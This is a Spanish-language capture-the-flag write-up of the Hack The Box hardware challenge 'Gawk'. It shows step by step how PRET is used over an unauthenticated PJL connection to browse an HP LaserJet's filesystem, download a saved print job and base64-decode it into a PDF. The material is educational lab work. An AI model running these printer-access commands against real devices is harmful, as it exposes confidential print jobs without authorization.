---
title: "Gawk"
description: "Writeup de Gawk - Hack The Box - Hardware 100pts. Impresora HP LaserJet 4200 expuesta en red con protocolo PJL; PRET (Printer Exploitation Toolkit) permite navegar el filesystem de la impresora; HR_Policies.pdf (base64-encoded) contiene la flag en texto plano tras decodificación."
sidebar:
  badge:
    text: Hardware
    variant: tip
tags:
  - htb
  - hardware
  - printer
  - pjl
  - pret
  - hp-laserjet
  - traversal
  - base64
---

# Gawk

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Hardware
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

El reto expone una impresora HP LaserJet 4200 accesible en red usando el protocolo PJL (Printer Job Language). PJL es un protocolo de Hewlett-Packard para controlar impresoras en red y, en implementaciones vulnerables, permite acceder al sistema de archivos interno de la impresora. PRET (Printer Exploitation Toolkit) implementa una interfaz de comandos similar a FTP para interactuar con impresoras a través de PJL, PostScript o PCL. Navegando por el filesystem de la impresora se encuentra `HR_Policies.pdf` en el directorio de trabajos guardados — pero el archivo está codificado en base64 y debe decodificarse para obtener el PDF real que contiene la flag.

---

## Reconocimiento inicial

```bash
# Conectar directamente con netcat para ver el banner
nc 154.57.164.74 31223
```

```
HP LASERJET 4200
PJL ready.
```

El banner confirma que es una impresora HP LaserJet con el protocolo PJL activo.

---

## Instalación y uso de PRET

```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
pip3 install -r requirements.txt

# Conectar a la impresora usando PJL
python3 pret.py 154.57.164.74:31223 pjl
```

```
      ________________
     /               /|
    /               / |
   /_______________/  |
   |               |  |
   |  LaserJet     |  |
   |  4200         | /
   |_______________|/

PRET shell (PJL) connected to 154.57.164.74:31223
>>> 
```

PRET proporciona una shell interactiva con comandos similares a FTP (`ls`, `cd`, `get`, `put`, etc.) pero para el filesystem de la impresora.

---

## Exploración del filesystem de la impresora

```bash
>>> ls
/
├── PostScript/
├── PJL/
├── saveDevice/
│   └── SavedJobs/
│       ├── InProgress/
│       │   └── HR_Policies.pdf
│       └── KeepJob/
└── webServer/
```

```bash
>>> ls /saveDevice/SavedJobs/InProgress/
 41893 HR_Policies.pdf
```

El archivo `HR_Policies.pdf` de 41893 bytes está en el directorio de trabajos de impresión en progreso.

---

## Descarga del archivo

```bash
>>> get /saveDevice/SavedJobs/InProgress/HR_Policies.pdf
Downloading HR_Policies.pdf ...
41893 bytes received.
```

```bash
exit
```

---

## Análisis del archivo descargado

```bash
file HR_Policies.pdf
# HR_Policies.pdf: ASCII text

head -5 HR_Policies.pdf
# JVBERi0xLjQKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURl
# Y29kZT4+CnN0cmVhbQp4nO2dy5LcxBKGX2VuoBHXqer+AYhbwMHgwIHDAYeBg4GDgcHAZmPeBYMx
# ...
```

El archivo no es un PDF real — es texto ASCII con caracteres base64. La firma `JVBERi0x` al inicio decodifica a `%PDF-1.` (el magic byte de los PDFs), confirmando que es un PDF codificado en base64.

---

## Decodificación del base64

```bash
base64 -d HR_Policies.pdf > HR_decoded.pdf

file HR_decoded.pdf
# HR_decoded.pdf: PDF document, version 1.4
```

Ahora es un PDF válido.

---

## Extracción del texto del PDF

```bash
pdftotext HR_decoded.pdf -
```

```
HR POLICIES — CONFIDENTIAL

...

Employee benefits include:
- Health insurance
- 401(k) matching
- Remote work options

[...varias páginas de políticas de RRHH...]

HTB{FLAG}
```

La flag aparece al final del documento PDF de políticas de RRHH.

---

## Cadena de Explotación

```text
1. HP LaserJet 4200 en 154.57.164.74:31223 con PJL expuesto en red
       ↓
2. PRET pret.py → shell PJL interactiva
       ↓
3. ls /saveDevice/SavedJobs/InProgress/ → HR_Policies.pdf (41893 bytes)
       ↓
4. get HR_Policies.pdf → descarga el archivo
       ↓
5. file → "ASCII text" (¡no es un PDF real!)
       ↓
6. head → "JVBERi0x..." (base64 de %PDF magic bytes)
       ↓
7. base64 -d HR_Policies.pdf > HR_decoded.pdf
       ↓
8. pdftotext HR_decoded.pdf → flag en el documento
```

---

## PJL: el protocolo de control de impresoras HP

PJL (Printer Job Language) fue diseñado por HP para enviar comandos de control a impresoras en red. Las capacidades de PJL incluyen:

- **Acceso al filesystem**: leer y escribir archivos en la memoria interna de la impresora.
- **Lectura de variables de entorno**: obtener información del sistema (modelo, versión de firmware, NVRAM).
- **Escritura en NVRAM**: modificar configuraciones persistentes.
- **Ejecución de trabajos PostScript**: PJL puede iniciar la interpretación de PostScript.

En implementaciones no seguras (sin autenticación), PJL permite el **directory traversal** completo del filesystem de la impresora — que puede contener trabajos de impresión anteriores con documentos confidenciales.

---

## Por qué las impresoras son vectores de ataque olvidados

Las impresoras de red son frecuentemente ignoradas en auditorías de seguridad:
- Se perciben como periféricos, no como sistemas con su propio OS y filesystem.
- Raramente se parchean o monitorizan.
- Pueden almacenar copias de todos los documentos impresos en el año.
- Tienen acceso privilegiado a la red interna (suelen estar en la VLAN de usuario).
- Muchas tienen credenciales de administración por defecto (o sin contraseña).

---

## Lecciones Aprendidas

- **Las impresoras tienen filesystems**: los trabajos de impresión se guardan antes de imprimirse. En una impresora con PJL expuesto sin autenticación, esos documentos son accesibles para cualquiera en la red.
- **PRET como herramienta de auditoría**: PRET soporta PJL, PostScript y PCL — los tres protocolos principales de impresoras HP y compatibles. Es esencial para auditar la seguridad de impresoras de red.
- **Detectar base64 por magic bytes**: `JVBERi0x` → `%PDF-1.x`; `UEsDBA` → ZIP; `/9j/4AA` → JPEG. Reconocer estos patrones base64 acelera el análisis de archivos con extensión engañosa.
- **Documentos de RRHH en impresoras = datos sensibles reales**: políticas, contratos, nóminas — este tipo de documentos son objetivo de espionaje industrial y cumplimiento de protección de datos (GDPR/LOPD).

---

## Referencias

- [PRET — Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- [PJL (Printer Job Language) — HP](https://developers.hp.com/hp-printer-command-languages)
- [Hacking Printers Wiki](http://www.hacking-printers.net/wiki/index.php/Main_Page)
- [MITRE ATT&CK — Peripheral Device Discovery](https://attack.mitre.org/techniques/T1120/)
